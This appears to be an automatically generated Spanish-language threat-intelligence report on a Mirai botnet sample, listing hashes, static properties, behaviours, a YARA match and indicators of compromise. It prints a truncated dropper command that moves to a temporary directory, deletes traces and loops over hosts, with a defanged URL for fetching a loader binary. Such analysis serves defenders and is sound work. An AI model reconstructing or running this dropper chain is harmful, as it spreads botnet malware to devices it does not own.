# 🧬 Payload Analysis

`b33d2d14fb389b136e176dba1683872897232463edc6ab5f5072153fcdd96d14`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución, Limpieza, Yara signature match. Se identificaron 2 comandos observados o extraídos. Se identificaron 6 indicadores técnicos. Una detección YARA válida respalda el análisis. **Ficha malware:** [malware-like/oraculo/botnet/b33d2d14fb389b136e176dba1683872897232463edc6ab5f5072153fcdd96d14.md](../../../../../malware-like/oraculo/botnet/b33d2d14fb389b136e176dba1683872897232463edc6ab5f5072153fcdd96d14.md)


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:40:04.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `b33d2d14fb389b136e176dba1683872897232463edc6ab5f5072153fcdd96d14`
- **MD5:** `9caaa3333a114bac5075300891a10f81`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | data |
| Tamaño | 1.2 KiB |
| Entropía | 5.43 |
| Strings | 12 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**
4. **Yara signature match**
5. **Cambio de permisos**
6. **Temp directory use**
7. **Comunicación remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=data; yara_matches=1; iocs=6

## 🖥️ Comandos observados / extraídos

```text
[4hroot@fedora-edge:~# cd /data/local/tmp 2>/dev/null||cd /tmp;rm -f /data/local/tmp/.d;for h in x9k4p7m2q5r8t3v6.mooo.c
-bash: syntax error near unexpected token `(wget'\n
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://$h:8080/bin/dlr.x86_64 | strings |
| url | hxxp://$h:8080/bin/dlr.x86_64)2 | strings |
| ip | 23.95.15.XXX | static_analysis |
| command | [4hroot@fedora-edge:~# cd /data/local/tmp 2>/dev/null\|\|cd /tmp;rm -f /data/local/tmp/.d;for h in x9k4p7m2q5r8t3v6.mooo.c | strings |
| command | -bash: syntax error near unexpected token `(wget'\n | strings |
| hash | b33d2d14fb389b136e176dba1683872897232463edc6ab5f5072153fcdd96d14 | static_analysis |
| ip | [internal-ip-redacted] | artifact_source |

## 🧬 Detecciones YARA

| Regla | Familia | Severidad | Confianza |
| --- | --- | --- | --- |
| Big_Numbers3 |  | medium | medium |

Detalle completo: [`detections.md`](detections.md).

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
